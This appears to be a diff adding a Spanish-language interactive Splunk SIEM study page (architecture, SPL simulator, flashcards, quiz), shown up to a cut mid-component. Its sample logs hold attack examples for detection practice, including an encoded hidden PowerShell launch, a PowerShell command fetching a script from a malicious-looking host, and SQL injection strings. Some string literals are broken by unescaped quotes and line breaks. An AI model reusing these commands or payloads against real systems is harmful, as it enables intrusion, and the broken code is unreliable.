@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Splunk SIEM - Guía Interactiva de Estudio</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    code, pre, .font-mono { font-family: 'JetBrains Mono', monospace; }
+  </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen">
+  <div id="root"></div>
+
+  <script type="text/babel">
+    const { useState } = React;
+
+    // Data extracted faithfully from notebook image
+    const PILLARS = [
+      {
+        id: 'monitoring',
+        title: 'Monitoring (Monitoreo)',
+        subtitle: 'Seguimiento continuo de eventos y métricas',
+        desc: 'Recolección constante de señales de red y sistemas para detectar anomalías, caídas de servicio o picos de tráfico en tiempo real.',
+        color: 'from-emerald-500 to-teal-600',
+        badge: 'Métrica continua'
+      },
+      {
+        id: 'visibility',
+        title: 'Visibility (Visibilidad)',
+        subtitle: 'Claridad total sobre lo que ocurre en la red',
+        desc: 'Eliminar puntos ciegos centralizando logs de servidores web, Windows, Linux y bases de datos en una única consola.',
+        color: 'from-cyan-500 to-blue-600',
+        badge: 'Vista 360°'
+      },
+      {
+        id: 'observability',
+        title: 'Observability (Observabilidad)',
+        subtitle: 'Entender el "por qué" detrás de cada incidente',
+        desc: 'Capacidad de explorar propiedades internas del sistema a través de sus salidas externas (logs, trazas, métricas) usando SPL.',
+        color: 'from-purple-500 to-indigo-600',
+        badge: 'Análisis profundo'
+      }
+    ];
+
+    const ARCH_NODES = {
+      forwarder: {
+        title: '1. Forwarder (Universal / Heavy)',
+        tag: 'Ingesta de Datos',
+        color: 'emerald',
+        notebookNotes: [
+          'Agent installed (Agente instalado en el origen)',
+          'Sending data to Splunk instance (Envía datos a la instancia de Splunk)'
+        ],
+        sources: [
+          {
+            name: 'Web Server',
+            detail: '(web traffic)',
+            example: '192.168.1.45 - - [15/Nov/2026:10:14:22] "POST /login HTTP/1.1" 401 512',
+            explanation: 'Logs de acceso y error HTTP/HTTPS (Apache, Nginx, IIS).'
+          },
+          {
+            name: 'Windows Sysmon data',
+            detail: '(Windows Event, PowerShell)',
+            example: 'EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell -enc JAB..."',
+            explanation: 'Creación de procesos, conexiones de red y ejecución de scripts en endpoints Windows.'
+          },
+          {
+            name: 'Linux',
+            detail: '(Host-centric logs)',
+            example: 'Nov 15 10:15:01 prod-srv sshd[2411]: Failed password for root from 10.0.0.88 port 51234 ssh2',
+            explanation: 'Logs del sistema operativo (/var/log/auth.log, syslog, auditd).'
+          },
+          {
+            name: 'Database',
+            detail: '(DB requests, responses, errors)',
+            example: '2026-11-15 10:16:09 UTC [ERROR] SQLSTATE[42000]: Syntax error or access violation near "UNION SELECT * FROM users"',
+            explanation: 'Consultas SQL, tiempos de respuesta, errores de permisos e intentos de SQL Injection.'
+          }
+        ]
+      },
+      indexer: {
+        title: '2. Indexer (Indexador)',
+        tag: 'Main Role (Rol Principal)',
+        color: 'amber',
+        notebookNotes: [
+          'Parses (Analiza sintácticamente el texto crudo)',
+          'Normalizes (Normaliza campos bajo un esquema común)',
+          'Categorizes (Categoriza eventos por sourcetype, host, index)',
+          'Store (Almacena como archivos comprimidos e índices de búsqueda rápida)'
+        ],
+        steps: [
+          { step: 'Parses', desc: 'Divide el flujo de datos en eventos individuales, extrae marcas de tiempo (timestamps) y delimita líneas.' },
+          { step: 'Normalizes', desc: 'Extrae pares clave-valor (como src_ip, status, user) para que logs distintos hablen el mismo idioma (CIM).' },
+          { step: 'Categorizes', desc: 'Etiqueta los datos asignando metadatos clave: host (quién), source (dónde) y sourcetype (qué formato).' },
+          { step: 'Store', desc: 'Guarda los datos en buckets en disco (Hot, Warm, Cold) optimizados para búsquedas ultrarrápidas.' }
+        ]
+      },
+      searchhead: {
+        title: '3. Search Head (Cabeza de Búsqueda)',
+        tag: 'Análisis y Visualización',
+        color: 'sky',
+        notebookNotes: [
+          'Search and Report App (Aplicación principal de búsqueda y reportes)',
+          'SPL - Search Processing Language (Lenguaje de procesamiento de búsquedas)',
+          'Create Dashboard (Creación de paneles con gráficos de líneas, circulares y barras)',
+          'Tables (Tablas estructuradas de resultados)'
+        ],
+        capabilities: [
+          { name: 'Search and Report App', desc: 'Interfaz donde el analista SOC investiga incidentes y programa alertas.' },
+          { name: 'SPL (Search Processing Language)', desc: 'Lenguaje de tuberías (pipes |) con comandos como stats, timechart, top, table, where.' },
+          { name: 'Create Dashboard', desc: 'Paneles visuales interactivos con gráficos de tendencias (líneas), distribución (pastel) y conteos (barras).' },
+          { name: 'Tables', desc: 'Vistas tabulares limpias para exportar evidencias o cruzar indicadores de compromiso (IoCs).' }
+        ]
+      }
+    };
+
+    const SIMULATOR_DATA = {
+      webserver: {
+        label: 'Web Server (web traffic)',
+        sourcetype: 'access_combined',
+        index: 'web_logs',
+        rawLog: '185.220.101.34 - - [15/Nov/2026:13:20:11 +0300] "GET /admin/config.php HTTP/1.1" 403 289 "-" "Mozilla/5.0"',
+        parsed: {
+          timestamp: '2026-11-15 13:20:11',
+          src_ip: '185.220.101.34',
+          method: 'GET',
+          uri_path: '/admin/config.php',
+          status: '403 (Forbidden)',
+          category: 'Web Application Attack / Reconnaissance'
+        },
+        splQueries: [
+          {
+            cmd: 'index=web_logs sourcetype=access_combined | stats count by status',
+            desc: 'Agrupa el tráfico web por código de respuesta HTTP (Gráfico de Barras / Pastel)',
+            chartType: 'bar',
+            results: [
+              { label: '200 OK', value: 1420, pct: 75, color: 'bg-emerald-500' },
+              { label: '403 Forbidden', value: 310, pct: 16, color: 'bg-amber-500' },
+              { label: '401 Unauthorized', value: 120, pct: 6, color: 'bg-rose-500' },
+              { label: '500 Server Error', value: 45, pct: 3, color: 'bg-purple-500' }
+            ]
+          },
+          {
+            cmd: 'index=web_logs status>=400 | table _time, src_ip, method, uri_path, status',
+            desc: 'Crea una tabla (Tables) con los intentos fallidos o bloqueados en el servidor web',
+            chartType: 'table',
+            headers: ['_time', 'src_ip', 'method', 'uri_path', 'status'],
+            rows: [
+              ['13:20:11', '185.220.101.34', 'GET', '/admin/config.php', '403'],
+              ['13:20:14', '185.220.101.34', 'POST', '/wp-login.php', '401'],
+              ['13:21:02', '91.132.14.88', 'GET', '/.env', '403'],
+              ['13:22:19', '103.45.12.9', 'GET', '/api/v1/users?id=1 OR 1=1', '500']
+            ]
+          }
+        ]
+      },
+      windows: {
+        label: 'Windows Sysmon (Windows Event, PowerShell)',
+        sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
+        index: 'win_sysmon',
+        rawLog: 'EventID=1 UtcTime="2026-11-15 10:25:40.112" Computer="WIN-SOC-PC04" User="CORP\\jdoe" Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA..."',
+        parsed: {
+          timestamp: '2026-11-15 10:25:40.112',
+          EventID: '1 (Process Creation)',
+          host: 'WIN-SOC-PC04',
+          user: 'CORP\jdoe',
+          process_name: 'powershell.exe',
+          category: 'Suspicious PowerShell Execution (Encoded)'
+        },
+        splQueries: [
+          {
+            cmd: 'index=win_sysmon EventID=1 | stats count by Image',
+            desc: 'Cuenta la creación de procesos en Windows para detectar uso inusual de PowerShell',
+            chartType: 'bar',
+            results: [
+              { label: 'svchost.exe', value: 890, pct: 60, color: 'bg-sky-500' },
+              { label: 'chrome.exe', value: 410, pct: 28, color: 'bg-emerald-500' },
+              { label: 'powershell.exe', value: 145, pct: 10, color: 'bg-amber-500' },
+              { label: 'cmd.exe', value: 35, pct: 2, color: 'bg-rose-500' }
+            ]
+          },
+          {
+            cmd: 'index=win_sysmon Image="*powershell.exe" | table _time, Computer, User, CommandLine',
+            desc: 'Tabla de auditoría de comandos ejecutados en PowerShell',
+            chartType: 'table',
+            headers: ['_time', 'Computer', 'User', 'CommandLine'],
+            rows: [
+              ['10:25:40', 'WIN-SOC-PC04', 'CORP\jdoe', 'powershell.exe -NoP -W Hidden -Enc SQBFAFgA...'],
+              ['10:26:12', 'WIN-SOC-PC04', 'CORP\jdoe', 'powershell.exe Invoke-WebRequest http://mal.io/a.ps1'],
+              ['10:30:00', 'SRV-AD-01', 'NT AUTHORITY\SYSTEM', 'powershell.exe Get-ADUser -Filter *']
+            ]
+          }
+        ]
+      },
+      linux: {
+        label: 'Linux (Host-centric logs)',
+        sourcetype: 'linux_secure',
+        index: 'os_linux',
+        rawLog: 'Nov 15 13:31:08 ubuntu-db-01 sshd[19402]: Failed password for invalid user admin from 45.155.205.233 port 48912 ssh2',
+        parsed: {
+          timestamp: 'Nov 15 13:31:08',
+          host: 'ubuntu-db-01',
+          process: 'sshd (PID 19402)',
+          action: 'Failed password',
+          src_ip: '45.155.205.233',
+          category: 'Host-centric Authentication / SSH Brute Force'
+        },
+        splQueries: [
+          {
+            cmd: 'index=os_linux sourcetype=linux_secure "Failed password" | top src_ip',
+            desc: 'Identifica las IPs atacantes con más intentos fallidos por SSH',
+            chartType: 'bar',
+            results: [
+              { label: '45.155.205.233', value: 540, pct: 65, color: 'bg-rose-500' },
+              { label: '194.26.29.11', value: 180, pct: 22, color: 'bg-amber-500' },
+              { label: '10.0.4.15 (Internal)', value: 75, pct: 9, color: 'bg-sky-500' },
+              { label: 'Otros', value: 35, pct: 4, color: 'bg-slate-500' }
+            ]
+          },
+          {
+            cmd: 'index=os_linux sourcetype=linux_secure | table _time, host, process, user, src_ip, action',
+            desc: 'Tabla de eventos centrados en el host Linux (Host-centric logs)',
+            chartType: 'table',
+            headers: ['_time', 'host', 'process', 'user', 'src_ip', 'action'],
+            rows: [
+              ['13:31:08', 'ubuntu-db-01', 'sshd', 'admin', '45.155.205.233', 'Failed password'],
+              ['13:31:10', 'ubuntu-db-01', 'sshd', 'root', '45.155.205.233', 'Failed password'],
+              ['13:32:01', 'ubuntu-db-01', 'sudo', 'tiago', 'localhost', 'COMMAND=/bin/systemctl restart nginx']
+            ]
+          }
+        ]
+      },
+      database: {
+        label: 'Database (DB requests, responses, errors)',
+        sourcetype: 'mysql:error',
+        index: 'db_audit',
+        rawLog: '2026-11-15T10:40:19.882104Z 412 [ERROR] [MY-010926] [Server] Access denied for user 'app_read'@'10.20.1.14' (using password: YES) | Query: SELECT credit_card FROM billing_data',
+        parsed: {
+          timestamp: '2026-11-15 10:40:19',
+          severity: 'ERROR (MY-010926)',
+          db_user: 'app_read@10.20.1.14',
+          db_request: 'SELECT credit_card FROM billing_data',
+          db_response: 'Access denied',
+          category: 'Database Requests, Responses & Errors'
+        },
+        splQueries: [
+          {
+            cmd: 'index=db_audit | stats count by operation_status',
+            desc: 'Distribución entre DB requests exitosos, respuestas lentas y errores',
+            chartType: 'bar',
+            results: [
+              { label: '200 OK Response (<50ms)', value: 3200, pct: 82, color: 'bg-emerald-500' },
+              { label: 'Slow Response (>1000ms)', value: 490, pct: 13, color: 'bg-amber-500' },
+              { label: 'DB Error / Access Denied', value: 195, pct: 5, color: 'bg-rose-500' }
+            ]
+          },
+          {
+            cmd: 'index=db_audit severity=ERROR | table _time, db_user, db_request, db_response',
+            desc: 'Tabla de errores y peticiones sospechosas a la base de datos',
+            chartType: 'table',
+            headers: ['_time', 'db_user', 'db_request', 'db_response'],
+            rows: [
+              ['10:40:19', 'app_read@10.20.1.14', 'SELECT credit_card FROM billing_data', 'ERROR: Access denied'],
+              ['10:41:05', 'web_usr@10.20.1.8', 'SELECT * FROM users WHERE id='1' UNION SELECT...', 'ERROR: Syntax error (SQLi)'],
+              ['10:42:30', 'admin@localhost', 'DROP TABLE temp_sessions', 'OK: 0 rows affected']
+            ]
+          }
+        ]
+      }
+    };
+
+    const FLASHCARDS = [
+      {
+        q: '¿Cuáles son los 3 pilares clave de Splunk SIEM anotados en la esquina superior derecha de tus apuntes?',
+        a: '1. Monitoring (Monitoreo continuo)
+2. Visibility (Visibilidad de la red)
+3. Observability (Observabilidad profunda)'
+      },
+      {
+        q: '¿Cuáles son los 3 componentes principales de la arquitectura de Splunk en orden de flujo?',
+        a: 'Forwarder ➔ Indexer ➔ Search Head'
+      },
+      {
+        q: '¿Qué es el Forwarder y cuál es su función según tus apuntes?',
+        a: 'Es un agente instalado en los sistemas origen ("Agent installed") cuya misión es enviar datos/logs hacia la instancia de Splunk ("Sending data to Splunk instance").'
+      },
+      {
+        q: '¿Cuáles son las 4 fuentes de logs que alimentan al Forwarder en tus apuntes?',
+        a: '1. Web Server (web traffic)
+2. Windows Sysmon data (Windows Event, PowerShell)
+3. Linux (Host-centric logs)
+4. Database (DB requests, responses, errors)'
+      },
+      {
+        q: '¿Cuál es el "Main Role" (Rol Principal) del Indexer en sus 4 etapas?',
+        a: '1. Parses (Analiza sintácticamente)
+2. Normalizes (Normaliza campos)
+3. Categorizes (Categoriza eventos)
+4. Store (Almacena e indexa en disco)'
+      },
+      {
+        q: '¿Qué elementos componen el Search Head en tu esquema?',
+        a: '• Search and Report App
+• SPL (Search Processing Language)
+• Create Dashboard (gráficos de líneas, pastel y barras)
+• Tables (tablas de resultados)'
+      }
+    ];
+
+    const QUIZ_QUESTIONS = [
+      {
+        question: 'Según tus apuntes, ¿qué componente tiene instalado un agente ("Agent installed") y envía los logs hacia la instancia de Splunk?',
+        options: ['Search Head', 'Indexer', 'Forwarder', 'SPL Engine'],
+        correct: 2,
+        explanation: '¡Exacto! El Forwarder es el agente ligero instalado en los servidores o endpoints para recolectar y enviar logs a Splunk.'
+      },
+      {
+        question: '¿Qué tipo específico de datos de Windows mencionan tus apuntes como fuente para el Forwarder?',
+        options: [
+          'Active Directory GPOs únicamente',
+          'Windows Sysmon data (Windows Event, PowerShell)',
+          'Archivos de Office y OneDrive',
+          'Logs exclusivos de firewall perimetral'
+        ],
+        correct: 1,
+        explanation: '¡Correcto! Tus apuntes destacan "Windows Sysmon data (Windows Event, PowerShell)", fundamentales en un SOC para detectar ataques en endpoints.'
+      },
+      {
+        question: '¿Cuáles son las 4 acciones que definen el "Main Role" (Rol Principal) del Indexer?',
+        options: [
+          'Search, Report, Alert, Dashboard',
+          'Install, Forward, Encrypt, Delete',
+          'Parses, Normalizes, Categorizes, Store',
+          'Monitoring, Visibility, Observability, Graphing'
+        ],
+        correct: 2,
+        explanation: '¡Muy bien! El Indexer recibe el dato crudo y lo procesa: Parses (analiza), Normalizes (normaliza), Categorizes (categoriza) y Store (almacena).'
+      },
+      {
+        question: '¿Qué significa la sigla SPL dentro del Search Head?',
+        options: [
+          'System Protocol Log',
+          'Search Processing Language',
+          'Splunk Parsing Layer',
+          'Security Policy List'
+        ],
+        correct: 1,
+        explanation: '¡Así es! SPL significa Search Processing Language, el lenguaje de consultas de Splunk para filtrar datos y crear Dashboards y Tables.'
+      },
+      {
+        question: 'En tus apuntes, ¿cómo se describen los logs provenientes de Linux y de Database?',
+        options: [
+          'Linux (Host-centric logs) y Database (DB requests, responses, errors)',
+          'Linux (Kernel panic) y Database (Backup logs)',
+          'Linux (Web traffic) y Database (PowerShell)',
+          'Linux (SPL) y Database (Indexers)'
+        ],
+        correct: 0,
+        explanation: '¡Perfecto! Anotaste específicamente: Linux (Host-centric logs) y Database (DB requests, responses, errors).'
+      }
+    ];
+
+    function App() {
+      const [activeTab, setActiveTab] = useState('arch');
+      const [selectedNode, setSelectedNode] = useState('forwarder');
+      const [simSource, setSimSource] = useState('webserver');
+      const [simQueryIdx, setSimQueryIdx] = useState(0);
+      const [flippedCards, setFlippedCards] = useState({});
+      const [quizAnswers, setQuizAnswers] = useState({});
+      const [showNotebookModal, setShowNotebookModal] = useState(false);
+
+      const currentSim = SIMULATOR_DATA[simSource];
+      const currentQuery = currentSim.splQueries[simQueryIdx] || currentSim.splQueries[0];
+
+      const toggleCard = (idx) => {
+        setFlippedCards((prev) => ({ ...prev, [idx]: !prev[idx] }));
+      };
+
+      const handleQuizSelect = (qIdx, optIdx) => {
+        setQuizAnswers((prev) => ({ ...prev, [qIdx]: optIdx }));
+      };
+
+      const score = Object.keys(quizAnswers).reduce((acc, qIdx) => {
+        return acc + (quizAnswers[qIdx] === QUIZ_QUESTIONS[qIdx].correct ? 1 : 0);
+      }, 0);
+
+      return (
+        <div className="min-h-screen flex flex-col bg-slate-950 text-slate-100">
+          {/* Top Header */}
+          <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-30">
+            <div className="max-w-6xl mx-auto px-4 py-4 flex flex-wrap items-center justify-between gap-4">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-400 to-cyan-600 flex items-center justify-center font-bold text-slate-950 text-xl shadow-lg shadow-emerald-500/20">
+                  S&gt;
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h1 className="text-xl font-bold tracking-tight text-white">Splunk SIEM</h1>
+                    <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-medium">
+                      Mis Apuntes Interactivos
+                    </span>
+                  </div>
+                  <p className="text-xs text-slate-400">
+                    Network ➔ Logs ➔ Splunk (Forwarder • Indexer • Search Head)
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-2">
+                <button
+                  onClick={() => setShowNotebookModal(true)}
+                  className="text-xs px-3 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition flex items-center gap-1.5"
+                >
+                  <span>📓</span> Ver Resumen del Cuaderno
+                </button>
+              </div>
+            </div>
+
+            {/* Navigation Tabs */}
+            <div className="max-w-6xl mx-auto px-4 flex gap-1 overflow-x-auto pb-2">
+              {[
+                { id: 'arch', label: '1. Arquitectura Interactiva' },
+                { id: 'sim', label: '2. Simulador Pipeline & SPL' },
+                { id: 'cards', label: '3. Flashcards de Estudio' },
+                { id: 'quiz', label: '4. Quiz de Evaluación' }
+              ].map((tab) => (
+                <button
+                  key={tab.id}
+                  onClick={() => setActiveTab(tab.id)}
+                  className={`px-4 py-2 rounded-lg text-sm font-medium transition whitespace-nowrap ${
+                    activeTab === tab.id
+                      ? 'bg-emerald-500 text-slate-950 font-semibold shadow-md shadow-emerald-500/20'
+                      : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
+                  }`}
+                >
+                  {tab.label}
+                </button>
+              ))}
+            </div>
+          </header>
+
+          {/* Main Content */}
+          <main className="max-w-6xl mx-auto w-full px-4 py-6 flex-1 space-y-8">
+            {/* TAB 1: ARQUITECTURA INTERACTIVA */}
+            {activeTab === 'arch' && (
+              <div className="space-y-8">
+                {/* 3 Pillars Section */}
+                <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-5">
+                  <div className="flex flex-col md:flex-row md:items-center justify-between gap-2 mb-4">
+                    <div>
+                      <span className="text-xs uppercase tracking-wider text-emerald-400 font-semibold">
+                        Objetivo del SIEM (Esquina superior derecha de tu hoja)
+                      </span>
+                      <h2 className="text-lg font-bold text-white">
+                        Los 3 Pilares de Splunk: Monitoring, Visibility & Observability
+                      </h2>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    {PILLARS.map((p) => (
+                      <div
+                        key={p.id}
+                        className="bg-slate-950/70 border border-slate-800/90 rounded-xl p-4 hover:border-slate-700 transition"
+                      >
+                        <div className="flex items-center justify-between mb-2">
+                          <span className={`text-xs font-semibold px-2.5 py-0.5 rounded-full bg-gradient-to-r ${p.color} text-white`}>
+                            {p.badge}
+                          </span>
+                        </div>
+                        <h3 className="font-bold text-slate-100 text-base">{p.title}</h3>
+                        <p className="text-xs text-emerald-400 mb-2">{p.subtitle}</p>
+                        <p className="text-xs text-slate-400 leading-relaxed">{p.desc}</p>
+                      </div>
+                    ))}
+                  </div>
+                </section>
+
+                {/* Interactive Flow Diagram */}
+                <section className="space-y-4">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <h2 className="text-lg font-bold text-white">
+                        Flujo de Datos: Network ➔ Logs ➔ Splunk
+                      </h2>
+                      <p className="text-xs text-slate-400">
+                        Haz clic en cada bloque (Forwarder, Indexer o Search Head) para estudiar los detalles de tus apuntes.
+                      </p>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    {/* Forwarder Card */}
+                    <button
+                      onClick={() => setSelectedNode('forwarder')}
+                      className={`text-left p-5 rounded-2xl border transition relative overflow-hidden ${
+                        selectedNode === 'forwarder'
+                          ? 'bg-emerald-950/30 border-emerald-500 ring-2 ring-emerald-500/30'
+                          : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-2">
+                        <span className="text-xs font-mono uppercase px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">
+                          Paso 1 • Ingesta
+                        </span>
+                        <span className="text-lg">📡</span>
+                      </div>
+                      <h3 className="text-xl font-bold text-white mb-1">Forwarder</h3>
+                      <p className="text-xs text-slate-400 mb-3">
+                        Agent installed ➔ Sending data to Splunk instance
+                      </p>
+                      <div className="text-xs text-emerald-400 font-medium">
+                        4 fuentes de logs conectadas →
+                      </div>
+                    </button>
+
+                    {/* Indexer Card */}
+                    <button
+                      onClick={() => setSelectedNode('indexer')}
+                      className={`text-left p-5 rounded-2xl border transition relative overflow-hidden ${
+                        selectedNode === 'indexer'
+                          ? 'bg-amber-950/30 border-amber-500 ring-2 ring-amber-500/30'
+                          : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-2">
+                        <span className="text-xs font-mono uppercase px-2 py-0.5 rounded bg-amber-500/20 text-amber-300">
+                          Paso 2 • Main Role
+                        </span>
+                        <span className="text-lg">⚙️</span>
+                      </div>
+                      <h3 className="text-xl font-bold text-white mb-1">Indexer</h3>
+                      <p className="text-xs text-slate-400 mb-3">
+                        Parses • Normalizes • Categorizes • Store
+                      </p>
+                      <div className="text-xs text-amber-400 font-medium">
+                        Ver las 4 fases de procesamiento →
+                      </div>
+                    </button>
+
+                    {/* Search Head Card */}
+                    <button
+                      onClick={() => setSelectedNode('searchhead')}
+                      className={`text-left p-5 rounded-2xl border transition relative overflow-hidden ${
+                        selectedNode === 'searchhead'
+                          ? 'bg-sky-950/30 border-sky-500 ring-2 ring-sky-500/30'
+                          : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
+                      }`}
+                    >
+                      <div className="flex items-center justify-between mb-2">
+                        <span className="text-xs font-mono uppercase px-2 py-0.5 rounded bg-sky-500/20 text-sky-300">
+                          Paso 3 • Consulta
+                        </span>
+                        <span className="text-lg">📊</span>
+                      </div>
+                      <h3 className="text-xl font-bold text-white mb-1">Search Head</h3>
+                      <p className="text-xs text-slate-400 mb-3">
+                        Search & Report App • SPL • Dashboards & Tables
+                      </p>
+                      <div className="text-xs text-sky-400 font-medium">
+                        Explorar SPL y Visualización →
+                      </div>
+                    </button>
+                  </div>
+
+                  {/* Detailed Node Panel */}
+                  <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
+                    {selectedNode === 'forwarder' && (
+                      <div className="space-y-6">
+                        <div className="border-b border-slate-800 pb-4">
+                          <span className="text-xs font-mono text-emerald-400 uppercase">
+                            Componente 1 de tus apuntes
+                          </span>
+                          <h3 className="text-2xl font-bold text-white mt-1">
+                            {ARCH_NODES.forwarder.title}
+                          </h3>
+                          <div className="mt-3 flex flex-wrap gap-2">
+                            {ARCH_NODES.forwarder.notebookNotes.map((note, i) => (
+                              <span
+                                key={i}
+                                className="text-xs bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 px-3 py-1 rounded-lg font-mono"
+                              >
+                                ✏️ "{note}"
+                              </span>
+                            ))}
+                          </div>
+                        </div>
+
+                        <div>
+                          <h4 className="text-sm font-semibold text-slate-200 mb-3">
+                            Fuentes de Datos (Logs enviados por el Forwarder):
+                          </h4>
+                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            {ARCH_NODES.forwarder.sources.map((src, idx) => (
+                              <div
+                                key={idx}
+                                className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-2"
+                              >
+                                <div className="flex items-center justify-between">
+                                  <span className="font-bold text-emerald-400 text-sm">
+                                    • {src.name}{' '}
+                                    <span className="text-slate-400 font-normal">{src.detail}</span>
+                                  </span>
+                                </div>
+                                <p className="text-xs text-slate-300">{src.explanation}</p>
+                                <div className="bg-slate-900 p-2.5 rounded-lg border border-slate-800 font-mono text-[11px] text-slate-300 overflow-x-auto">
+                                  {src.example}
+                                </div>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      </div>
+                    )}
+
+                    {selectedNode === 'indexer' && (
+                      <div className="space-y-6">
+                        <div className="border-b border-slate-800 pb-4">
+                          <span className="text-xs font-mono text-amber-400 uppercase">
+                            Componente 2 de tus apuntes • Main Role
+                          </span>
+                          <h3 className="text-2xl font-bold text-white mt-1">
+                            {ARCH_NODES.indexer.title}
+                          </h3>
+                          <p className="text-xs text-slate-400 mt-1">
+                            Cuando el Forwarder envía los datos, el Indexer cumple su rol principal en 4 etapas exactas:
+                          </p>
+                        </div>
+
+                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                          {ARCH_NODES.indexer.steps.map((item, idx) => (
+                            <div
+                              key={idx}
+                              className="bg-slate-950 border border-amber-500/20 rounded-xl p-4 flex flex-col justify-between"
+                            >
+                              <div>
+                                <div className="text-xs font-mono text-amber-400 mb-1">
+                                  Fase 0{idx + 1}
+                                </div>
+                                <h4 className="text-lg font-bold text-white mb-2">• {item.step}</h4>
+                                <p className="text-xs text-slate-300 leading-relaxed">{item.desc}</p>
+                              </div>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
+
+                    {selectedNode === 'searchhead' && (
+                      <div className="space-y-6">
+                        <div className="border-b border-slate-800 pb-4">
+                          <span className="text-xs font-mono text-sky-400 uppercase">
+                            Componente 3 de tus apuntes
+                          </span>
+                          <h3 className="text-2xl font-bold text-white mt-1">
+                            {ARCH_NODES.searchhead.title}
+                          </h3>
+                          <p className="text-xs text-slate-400 mt-1">
+                            Es el cerebro analítico donde el usuario interactúa con los datos indexados mediante SPL.
+                          </p>
+                        </div>
+
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                          {ARCH_NODES.searchhead.capabilities.map((cap, idx) => (
+                            <div
+                              key={idx}
+                              className="bg-slate-950 border border-sky-500/20 rounded-xl p-4"
+                            >
+                              <h4 className="text-base font-bold text-sky-400 mb-1">
+                                • {cap.name}
+                              </h4>
+                              <p className="text-xs text-slate-300 leading-relaxed">{cap.desc}</p>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </section>
+              </div>
+            )}
+
+            {/* TAB 2: SIMULADOR DE PIPELINE & SPL */}
+            {activeTab === 'sim' && (
+              <div className="space-y-6">
+                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
+                  <h2 className="text-lg font-bold text-white mb-1">
+                    Laboratorio en Vivo: De Log Crudo a Dashboard con SPL
+                  </h2>
+                  <p className="text-xs text-slate-400 mb-4">
+                    Selecciona una de las 4 fuentes de tu cuaderno para ver cómo viaja por el Forwarder, cómo lo transforma el Indexer y cómo lo consulta el Search Head.
+                  </p>
+
+                  {/* Source Selector */}
+                  <div className="flex flex-wrap gap-2 mb-6">
+                    {Object.entries(SIMULATOR_DATA).map(([key, item]) => (
+                      <button
+                        key={key}
+                        onClick={() => {
+                          setSimSource(key);
+                          setSimQueryIdx(0);
+                        }}
+                        className={`px-3.5 py-2 rounded-xl text-xs font-semibold transition border ${
+                          simSource === key
+                            ? 'bg-emerald-500 text-slate-950 border-emerald-400'
+                            : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                        }`}
+                      >
+                        {item.label}
+                      </button>
+                    ))}
+                  </div>
+
+                  {/* Step 1 & Step 2 Grid */}
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
+                    {/* Forwarder Raw Log */}
+                    <div className="bg-slate-950 border border-emerald-500/30 rounded-xl p-4">
+                      <div className="flex items-center justify-between mb-2">
+                        <span className="text-xs font-mono font-semibold text-emerald-400">
+                          1. FORWARDER (Sending raw data)
+                        </span>
+                        <span className="text-[11px] font-mono text-slate-400">
+                          sourcetype={currentSim.sourcetype}
+                        </span>
+                      </div>
+                      <pre className="text-xs font-mono text-slate-200 bg-slate-900 p-3 rounded-lg border border-slate-800 whitespace-pre-wrap break-all">
+                        {currentSim.rawLog}
+                      </pre>
+                    </div>
+
+                    {/* Indexer Parsed/Normalized */}
+                    <div className="bg-slate-950 border border-amber-500/30 rounded-xl p-4">
+                      <div className="flex items-center justify-between mb-2">
+                        <span className="text-xs font-mono font-semibold text-amber-400">
+                          2. INDEXER (Parses, Normalizes, Categorizes, Store)
+                        </span>
+                        <span className="text-[11px] font-mono text-slate-400">
+                          index={currentSim.index}
+                        </span>
+                      </div>
+                      <div className="grid grid-cols-2 gap-2 text-xs">
+                        {Object.entries(currentSim.parsed).map(([k, v]) => (
+                          <div
+                            key={k}
